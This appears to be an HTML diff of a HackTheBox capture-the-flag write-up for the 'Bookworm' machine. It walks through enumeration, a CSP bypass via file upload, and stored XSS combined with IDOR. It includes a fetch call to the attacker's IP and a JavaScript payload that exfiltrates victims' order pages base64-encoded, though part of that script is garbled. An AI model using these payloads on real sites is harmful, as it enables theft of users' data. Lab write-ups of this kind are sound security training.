@@ -1,0 +1,1685 @@
+<title>
+ HackTheBox - Bookworm (Insane)
+</title>
+<header>
+ <div class="header">
+  <img class="headerImage" src="https://images.unsplash.com/photo-1588580000645-4562a6d2c839?ixlib=rb-4.0.3&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb"/>
+  <img class="headerIcon" src="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/f0c89af6ee134e1b432d95e4528cf0cd.png"/>
+  <h1 class="mainTitle">
+   HackTheBox - Bookworm (Insane)
+  </h1>
+ </div>
+ <p class="boxLink">
+ </p>
+</header>
+<div class="writeUp">
+ <h1 id="898bf9c0-7589-4197-960c-60e9c69b5ed1">
+  Table of contents
+ </h1>
+ <nav id="5850ddf4-9aa0-4329-888a-46ecefa2e5be">
+  <div>
+   <a href="#898bf9c0-7589-4197-960c-60e9c69b5ed1">
+    Table of contents
+   </a>
+  </div>
+  <div>
+   <a href="#c81a085b-8f7a-4411-aae4-3c40f90f95d6">
+    Enumeration
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#13a80d81-6dc3-4b3d-aef2-3fdba6dbf167">
+    Nmap scan
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#c089e277-ddef-4243-8013-2496c0eece8f">
+    Web enumeration
+   </a>
+  </div>
+  <div>
+   <a href="#a942c0ea-b859-43a4-8e90-9ebbb8539e6a">
+    Initial access
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#1ba34698-3651-4a5f-a3ea-66689067508f">
+    XSS (Cross Site Scripting)
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#9b850bea-be09-4404-816e-952af9ccb63a">
+    XSS + IDOR (Cross Site Scripting + Insecure Direct Object Reference)
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#70ea5708-162d-4c14-b5f5-99aff3a46d9e">
+    Directory Traversal
+   </a>
+  </div>
+  <div>
+   <a href="#c272b349-25db-46dd-88f6-f7fb97cdd617">
+    Post-exploitation
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#acd64a9b-eebe-4a6e-995d-e2498c430203">
+    Local enumeration
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#f77929c7-3e9b-4dfc-9f80-47f4d1b6a430">
+    Privilege escalation (neil)
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#7189b61e-34b6-4144-8d6c-2844e178552b">
+    Privilege escalation (root)
+   </a>
+  </div>
+  <div>
+   <a href="#086a3cf1-00ba-4773-8091-ba6cd2c0276e">
+    Clearing tracks
+   </a>
+  </div>
+  <div>
+   <a href="#9875ebe5-a153-4335-9e8f-d371f8de41ca">
+    Vulnerabilities summary
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#3ff61b09-bdba-4a0b-b4ff-27ce6e647432">
+    Arbitrary File Upload
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#b45e354e-4101-473d-ba8d-a1f44f75c59a">
+    Cross Site Scripting
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#402b0c3a-7f97-452e-b3f4-95c4cbd528d2">
+    Insecure Direct Object Reference
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#ad57e3e5-53a1-4c51-b482-1db7c49834d0">
+    Directory Traversal
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#67c3c4d1-b33b-4db0-a632-f560e2ecfc8d">
+    Missing input sanitization
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#3eb48a5d-017e-4709-9939-d393134a4a23">
+    Structured Query Language Injection
+   </a>
+  </div>
+  <div>
+   <a class="t2" href="#3b55144a-bfe0-4ad8-88a4-f8b96a30e953">
+    Arbitrary Code Execution
+   </a>
+  </div>
+  <div>
+   <a href="#3255166c-5158-4c45-b50e-8a165599631d">
+    Tools used
+   </a>
+  </div>
+  <div>
+   <a href="#4dad9cf9-5970-48ce-88f6-82bc0e5a5fd1">
+    Sources
+   </a>
+  </div>
+ </nav>
+ <h1 id="c81a085b-8f7a-4411-aae4-3c40f90f95d6">
+  Enumeration
+ </h1>
+ <h2 id="13a80d81-6dc3-4b3d-aef2-3fdba6dbf167">
+  Nmap scan
+ </h2>
+ <pre class="code" id="560075a4-493a-481a-b36e-6933cf94f506"><code># Nmap 7.93 scan initiated Tue May 30 01:29:31 2023 as: nmap -A -p- -oN nmapResults.txt -v 10.129.176.238
+Nmap scan report for 10.129.176.238
+Host is up (0.039s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 811d2235dd2115644a1fdc5c9c66e5e2 (RSA)
+|   256 01f90d3c221d948306a4967a011c9ea1 (ECDSA)
+|_  256 647d17179179f6d7c48774f8a216f7cf (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://bookworm.htb
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue May 30 01:29:51 2023 -- 1 IP address (1 host up) scanned in 19.67 seconds</code>
+</pre>
+ <h2 id="c089e277-ddef-4243-8013-2496c0eece8f">
+  Web enumeration
+ </h2>
+ <p id="a3a715bc-131c-4b54-ac70-2aa6828950dc">
+  When trying to go on
+  <strong>
+   http://[TARGET_IP]/
+  </strong>
+  , we are redirected to
+  <strong>
+   <a href="http://bookworm.htb/">
+    http://bookworm.htb/
+   </a>
+  </strong>
+  <strong>
+   /etc/hosts
+  </strong>
+  file :
+ </p>
+ <pre class="code" id="58d5b448-7853-4c9e-b7d1-03d06892a9c8"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ cat /etc/hosts
+127.0.0.1       localhost       gitea.searcher.htb
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.129.176.238  bookworm.htb</code>
+</pre>
+ <p id="f43d0a86-9025-4f88-83d0-0c5a40777d18">
+  Now, we can use our web browser to see what’s on the web server :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled.png"/>
+ </a>
+ <p id="ae144f01-d6f0-47c0-846c-0fe2e9b6917d">
+  So, the web application on the web server is an online bookstore. We can see on the top right corner that we can
+  <strong>
+   login
+  </strong>
+  . Let’s see what’s on the
+  <strong>
+   login page
+  </strong>
+  :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%201.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%201.png"/>
+ </a>
+ <p id="791bfd86-ee16-4fa2-848a-a8cba5d1de5f">
+  There is an hyperlink that can redirects us to
+  <strong>
+   <a href="http://bookworm.htb/login">
+    http://bookworm.htb/register
+   </a>
+  </strong>
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%202.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%202.png"/>
+ </a>
+ <p id="abeb59a9-1e24-4d77-9325-dca36f743176">
+  Let’s create an account, it may be useful to access more content on the website for further enumeration :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%203.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%203.png"/>
+ </a>
+ <p id="bb32f1bd-55de-4741-a0af-93d961289225">
+  After clicking on the
+  <strong>
+   Register
+  </strong>
+  button, we are redirected to the
+  <strong>
+   login page
+  </strong>
+  with this message :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%204.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%204.png"/>
+ </a>
+ <p id="3a9c83ba-5f32-406f-b900-778b9e86cef0">
+  After logging in, we are redirected to this page :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%205.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%205.png"/>
+ </a>
+ <p id="7468da31-fd81-43bd-82a9-e413e4e73ecf">
+  The first thing we can notice is the
+  <strong>
+   Recent Updates
+  </strong>
+  section which shows the last books added to the basket of any clients. If we take a look at the source code of the page, we can see an HTML comment containing a different number for each entries. This number seems to increment for each entries :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Capture_dcran_2023-06-02_103325.png">
+  <img src="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Capture_dcran_2023-06-02_103325.png"/>
+ </a>
+ <p id="6195cda6-550c-4d2a-ad9e-04acee1e4dc7">
+  We can keep this in mind for later. When we click on
+  <strong>
+   View Book
+  </strong>
+  under the book we want on the shop page, we have this page :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%206.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%206.png"/>
+ </a>
+ <p id="e94531b8-4504-4e51-bbc8-d7e0a30b5242">
+  We can add an item to our basket by clicking the
+  <strong>
+   ADD TO BASKET
+  </strong>
+  blue button. After we added the book to our basket, we are redirected to this page :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%207.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%207.png"/>
+ </a>
+ <p id="aedcc696-10a2-42e9-bfa8-65eec3896b3d">
+  We can see that our order is shown in the
+  <strong>
+   Recent Updates
+  </strong>
+  section. Now let’s click on
+  <strong>
+   Basket
+  </strong>
+  at the top left of the webpage to access our basket :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%208.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%208.png"/>
+ </a>
+ <p id="dd11eab3-838d-48c9-8dd8-122045313fd4">
+  There is a message saying that ebooks downloads are no more available except for old enough orders. Also, we can add a
+  <strong>
+   note
+  </strong>
+  to our order by clicking on the
+  <strong>
+   EDIT NOTE
+  </strong>
+  blue button :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%209.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%209.png"/>
+ </a>
+ <h1 id="a942c0ea-b859-43a4-8e90-9ebbb8539e6a">
+  Initial access
+ </h1>
+ <h2 id="1ba34698-3651-4a5f-a3ea-66689067508f">
+  XSS (Cross Site Scripting)
+ </h2>
+ <p id="8f73173e-0c64-496a-b23a-ebb56123fd71">
+  We can try to inject
+  <strong>
+   Javascript
+  </strong>
+  to see if it’s vulnerable to
+  <strong>
+   XSS (Cross Site Scripting)
+  </strong>
+  :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2010.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2010.png"/>
+ </a>
+ <p id="15d08c99-b426-45d0-aaaf-9f0a32e9aad3">
+  Now, we can click the
+  <strong>
+   UPDATE NOTE
+  </strong>
+  button, and then click the
+  <strong>
+   COMPLETE CHECKOUT
+  </strong>
+  button :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2011.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2011.png"/>
+ </a>
+ <p id="35222b9a-5c6e-4144-8a47-09271b411df4">
+  Nothing happens… But if we take a look at the console of our web browser :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2012.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2012.png"/>
+ </a>
+ <p id="7359e0e5-5b30-4359-8eef-0cc07259c82c">
+  There is a
+  <strong>
+   CSP
+  </strong>
+  that prevents us from injecting
+  <strong>
+   JavaScript
+  </strong>
+  code directly in this field. Let’s take a look at our request using
+  <a href="https://portswigger.net/burp">
+   <strong>
+    Burp Suite
+   </strong>
+  </a>
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2013.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2013.png"/>
+ </a>
+ <p id="659bb020-d6a0-43ff-bdff-d4ddbce171a1">
+  So the web server only accepts
+  <strong>
+   JavaScript
+  </strong>
+  code from itself. We can try to directly upload a
+  <strong>
+   JavaScript
+  </strong>
+  file on the web server, and then load it to bypass the
+  <strong>
+   CSP
+  </strong>
+  . Where can we find an upload functionality ? We can take a look at our
+  <strong>
+   profile
+  </strong>
+  to see if we can upload a profile picture. Let’s click on our profile at the top left of the page :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2014.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2014.png"/>
+ </a>
+ <p id="d7c3a8ab-f51c-45ee-9aba-1d6d3a22d25e">
+  We can upload a profile picture. Let’s try to upload a file containing the following
+  <strong>
+   JavaScript
+  </strong>
+  code :
+ </p>
+ <pre class="code" id="bd07d634-0a4b-4e50-a8bb-8f05d1c8b067"><code>alert("XSS !");</code>
+</pre>
+ <p id="4ff3f9d3-323b-479c-b0bf-91a5a316e84a">
+  Now, if we try to upload it as
+  <strong>
+   exploit.js
+  </strong>
+  for exemple, it will not work, but if we try to upload it as
+  <strong>
+   exploit.js.png
+  </strong>
+  :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2015.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2015.png"/>
+ </a>
+ <p id="4c5e932a-55a7-4510-b378-c9d121fa8aa4">
+  It seems that our profile picture changed and cannot be loaded… Let’s take a look at the source code to see where it was uploaded :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2016.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2016.png"/>
+ </a>
+ <p id="6fa9e45c-46e4-4ce0-8803-3d94800388e1">
+  Now, if we go to this URL, it will download a file called 14. If we open it, we have our
+  <strong>
+   JavaScript
+  </strong>
+  code in it. So, we are able to upload whatever we want to the webserver. The web server is vulnerable to
+  <strong>
+   AFU (Arbitrary File Upload)
+  </strong>
+  . Now, we can try to exploit a
+  <strong>
+   XSS (Cross Site Scripting)
+  </strong>
+  again on the order’s
+  <strong>
+   note
+  </strong>
+  but this time with this payload :
+ </p>
+ <pre class="code" id="7f7340a1-338a-4a3a-b746-4f1aada96f4b"><code><script src="/static/img/uploads/14"></script></code>
+</pre>
+ <p id="fe3ab28a-d43b-4e75-a4f8-4a7be7a8cff5">
+  Now, what happens if we access our
+  <strong>
+   order
+  </strong>
+  from our
+  <strong>
+   order history
+  </strong>
+  :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2017.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2017.png"/>
+ </a>
+ <p id="f9834137-47b5-418a-bcb9-c8de63614ee1">
+  It works ! We have a
+  <strong>
+   XSS (Cross Site Scripting)
+  </strong>
+  vulnerability here. We successfully bypassed the
+  <strong>
+   CSP
+  </strong>
+  . Now, what can we do with this ? Well, we cannot do anything useful on OUR orders… but remember, there was a
+  <strong>
+   unique number
+  </strong>
+  in a HTML comment in each
+  <strong>
+   Recent Updates
+  </strong>
+  entry. It looks like an
+  <strong>
+   id
+  </strong>
+  . Also, if we take a look at the request made when adding a
+  <strong>
+   note
+  </strong>
+  to our order :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Untitled%2018.png">
+  <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-/main//Bookworm/Untitled%2018.png"/>
+ </a>
+ <p id="f2270112-73c2-4e78-88c4-569b7d0665ef">
+  We can see our
+  <strong>
+   basket id
+  </strong>
+  in the URL and the
+  <strong>
+   note parameter
+  </strong>
+  . If we change the
+  <strong>
+   basket id
+  </strong>
+  , we may be able to add a
+  <strong>
+   note
+  </strong>
+  to another user’s
+  <strong>
+   basket
+  </strong>
+  containing the
+  <strong>
+   XSS payload
+  </strong>
+  .
+ </p>
+ <h2 id="9b850bea-be09-4404-816e-952af9ccb63a">
+  XSS + IDOR (Cross Site Scripting + Insecure Direct Object Reference)
+ </h2>
+ <p id="d8e88fea-38b4-4bbc-8449-8cd999cf1108">
+  First, let’s change our profile picture file to this :
+ </p>
+ <pre class="code" id="0075e23a-fdd7-44e8-b36b-8283e32d3845"><code>fetch("http://10.10.16.2/");</code>
+</pre>
+ <p id="31e75e98-ce00-45d1-b6e6-b2280c111468">
+  Now, we can open a web server using
+  <a href="https://www.python.org/downloads/">
+   <strong>
+    python3
+   </strong>
+  </a>
+ </p>
+ <pre class="code" id="e5a14a80-2f0c-46cb-8763-5efa3f843f5b"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code>
+</pre>
+ <p id="e1f1b04a-6930-43e5-a21e-583583708ca7">
+  Then, we can go to the shop page to grab an
+  <strong>
+   id
+  </strong>
+  in the
+  <strong>
+   Recent Updates
+  </strong>
+  section (we have to be fast enough because they disappear after something like 2 minutes). We inject our
+  <strong>
+   XSS payload
+  </strong>
+  in the
+  <strong>
+   note parameter
+  </strong>
+  , we change the
+  <strong>
+   basket id
+  </strong>
+  in the URI to the one we grabbed from the
+  <strong>
+   Recent Updates
+  </strong>
+  section. Our request should look like this :
+ </p>
+ <a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Capture_dcran_2023-06-02_103318.png">
+  <img src="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Capture_dcran_2023-06-02_103318.png"/>
+ </a>
+ <p id="40cd7efd-72bc-4637-a12f-c325b3ad9f7c">
+  Now, if we send this request and wait a maximum of 2 minutes :
+ </p>
+ <pre class="code" id="47f1b5fb-529a-4a9f-bc55-bf962b42b2d7"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.175.101 - - [02/Jun/2023 06:15:06] "GET / HTTP/1.1" 200 -</code>
+</pre>
+ <p id="811ef693-d803-448e-bd04-3dd9059d5407">
+  A request was successfully sent from the victim to our web server. Now we know that we can execute arbitrary
+  <strong>
+   JavaScript
+  </strong>
+  code on other client’s web browser and that the web server is vulnerable to
+  <strong>
+   IDOR (Insecure Direct Object Reference)
+  </strong>
+  . Now, what can we do with this ? Well, if you remember, there was a message saying that
+  <strong>
+   old orders
+  </strong>
+  still have the
+  <strong>
+   download functionality
+  </strong>
+  . There could be a vulnerability like a
+  <strong>
+   LFI (Local File Inclusion)
+  </strong>
+  on this functionality. So, we need to find the
+  <strong>
+   download functionality
+  </strong>
+  through the
+  <strong>
+   XSS (Cross Site Scripting)
+  </strong>
+  vulnerability since we don’t have access to it from our account. It may be available on the
+  <strong>
+   order page
+  </strong>
+  accessible from the
+  <strong>
+   profile
+  </strong>
+  page. Let’s craft a
+  <strong>
+   JavaScript
+  </strong>
+  payload that will fetch the
+  <strong>
+   profile
+  </strong>
+  page of the victim, gets his
+  <strong>
+   orders links
+  </strong>
+  , fetch the
+  <strong>
+   orders pages
+  </strong>
+  and then sends us the content of the pages in base64 encoding :
+ </p>
+ <pre class="code" id="c2c3be87-68f3-4d94-a558-26c4bb0fad30"><code>//Declare constants
+const base_url = "http://bookworm.htb"
+const profile_url = base_url+"/profile";
+const attacker = "http://10.10.16.2";
+
+//Function used to extract order ids from the text passed in 'pageContent' parameter
+function extractOrders(pageContent){
+    var lines = pageContent.split("\n");
+    var orders = new Array();
+    //Process each lines of the data passed in the "pageContent" parameter
+    //We start the loop at 1 to skip the line containing "Order History"
+    for(var i=1;i<lines.length;i++){ !="-1){" "="" ")="" "...="" "orders"="" 200...="" ?order_content="+btoa(request.responseText));
+        }
+    }
+}
+
+//Function used to get orders list from the profile page
+function getOrders(){
+    var request = new XMLHttpRequest();
+    request.open('GET', profile_url, false);
+    request.send(null);
+    if(request.status === 200){
+        return extractOrders(request.responseText);
+    }
+}
+
+//Execute the exploit
+extractOrderPages(getOrders());&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p id=" add="" array="" attacker="" base64="" code="" contains="" content="" encoding="" extract="" extractorderpages(ordersarray){="" false);="" fetch(attacker+"="" ffb947bb-5330-422a-b264-6ddf073a1e5d"="" for(var="" from="" function="" have="" http="" hyperlink="" i="0;i&lt;ordersArray.length;i++){" id="" ids="" if="" if(line.indexof("="" if(request.status="200){" in="" line="" list="" number="" of="" or="" order="" orders'="" orders.push(string[0]);="" orders;="" page="" request="new" request.open('get',="" request.send(null);="" response="" return="" send="" server="" string='string[1].split("\"");' the="" to="" url='base_url+"/order/"+ordersArray[i];' url,="" used="" var="" we="" web="" xmlhttprequest();="" }="">
+Now, we can update our <strong>profile picture</strong>
+ with this exploit. Then, we can do all the previous steps to execute our <strong>JavaScript</strong>
+ code on a victim web browser. Finally let’s take a look at our web server after waiting some time : 
+<pre class="code" id="49b1639a-7eef-4c1b-b914-faed6ec0f380"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Insane/Bookworm]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.175.101 - - [02/Jun/2023 06:59:37] "GET /?order_content=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIC8+CiAgICA8dGl0bGU+Qm9va3dvcm08L3RpdGxlPgogICAgPGxpbmsKICAgICAgaHJlZj0iL3N0YXRpYy9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiCiAgICAgIHJlbD0ic3R5bGVzaGVldCIKICAgIC8+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgbmF2YmFyLWRhcmsgYmctcHJpbWFyeSI+CiAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+CiAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iIyI+Qm9va3dvcm08L2E+CiAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLWJzLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtYnMtdGFyZ2V0PSIjbmF2YmFyVGV4dCIgYXJpYS1jb250cm9scz0ibmF2YmFyVGV4dCIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtbGFiZWw9IlRvZ2dsZSBuYXZpZ2F0aW9uIj4KICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdmJhci10b2dnbGVyLWljb24iPjwvc3Bhbj4KICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sbGFwc2UgbmF2YmFyLWNvbGxhcHNlIiBpZD0ibmF2YmFyVGV4dCI+CiAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiBtZS1hdXRvIG1iLTIgbWItbGctMCI+CiAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rICIgaHJlZj0iLyI+SG9tZTwvYT4KICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgIiBocmVmPSIvc2hvcCI+U2hvcDwvYT4KICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibmF2YmFyLW5hdiI+CiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgIiBocmVmPSIvYmFza2V0Ij5CYXNrZXQgKDApPC9hPgogICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rICIgaHJlZj0iL3Byb2ZpbGUiPkpha3ViIFBhcnRpY2xlczwvYT4KICAgICAgICAgICAgICAgIDxpbWcgY2xhc3M9Im5hdi1icmFuZCIgc3JjPSIvc3RhdGljL2ltZy91cGxvYWRzLzMiIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIvPgogICAgICAgICAgICAgIAogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvbmF2PgoKICA8ZGl2IGNsYXNzPSJjb250YWluZXIgbXQtMiI+CiAgICAgIAoKPGgxPlZpZXdpbmcgT3JkZXIgNzwvaDE+Cgo8cCBzdHlsZT0id2hpdGUtc3BhY2U6IHByZS1saW5lIj48c3Ryb25nPlNoaXBwaW5nIEFkZHJlc3M6PC9zdHJvbmc+PGJyPkpha3ViIFBhcnRpY2xlcwogIDE2IFN0YXRpb24gQXZlbnVlCiAgCiAgQnJhZGZvcmQKICBCRDYwIDBaWlo8L3A+CgoKPHRhYmxlIGNsYXNzPSJ0YWJsZSI+CiAgPHRoZWFkPgogICAgPHRyPgogICAgICA8dGggc2NvcGU9ImNvbCI+Qm9vazwvdGg+CiAgICAgIDx0aCBzY29wZT0iY29sIj5RdWFudGl0eTwvdGg+CiAgICAgIDx0aCBzY29wZT0iY29sIj5Ub3RhbCBQcmljZTwvdGg+CiAgICAgIDx0aCBzY29wZT0iY29sIj5Ob3RlPC90aD4KICAgICAgCiAgICAgIDx0aCBzY29wZT0iY29sIj48L3RoPgogICAgICAKICAgIDwvdHI+CiAgPC90aGVhZD4KICA8dGJvZHk+CiAgICAKICAgIDx0cj4KICAgICAgPHRoIHNjb3BlPSJyb3ciPlRvbSBTbGFkZSB3aXRoIHRoZSBGbHlpbmcgQ29ycHM6IEEgQ2FtcGZpcmUgVGFsZTwvdGg+CiAgICAgIDx0ZD4yPC90ZD4KICAgICAgPHRkPqMzNDwvdGQ+CiAgICAgIDx0ZD4KICAgICAgICAKICAgICAgPC90ZD4KICAgICAgCiAgICAgIDx0ZD4KICAgICAgICA8YSBocmVmPSIvZG93bmxvYWQvNz9ib29rSWRzPTkiIGRvd25sb2FkPSJUb20gU2xhZGUgd2l0aCB0aGUgRmx5aW5nIENvcnBzOiBBIENhbXBmaXJlIFRhbGUucGRmIj5Eb3dubG9hZCBlLWJvb2s8L2E+CiAgICAgICAgPC90ZD4KICAgICAgCiAgICA8L3RyPgogICAgCiAgPC90Ym9keT4KPC90YWJsZT4KCiAgCgo8YSBocmVmPSIvcHJvZmlsZSI+VmlldyBZb3VyIE90aGVyIE9yZGVyczwvYT4KCiAgPC9kaXY+CgogIDwvYm9keT4KPC9odG1sPgo= HTTP/1.1" 200 -
+[CROPPED]</code>
+</pre>
+<p id="cb7088b9-19e9-4233-8182-3312daf3592b">
+Now, if we decode one of those base64 strings : </p>
+<pre class="code" id="e23a0f36-6d49-4389-ace0-d7f3f1d0edc9"><code><!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Bookworm</title>
+    <link href="/static/css/bootstrap.min.css" rel="stylesheet"/>
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+      <div class="container-fluid">
+        <a class="navbar-brand" href="#">Bookworm</a>
+          <button aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-bs-target="#navbarText" data-bs-toggle="collapse" type="button">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+          <div class="collapse navbar-collapse" id="navbarText">
+            <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+              <a class="nav-link" href="/">Home</a>
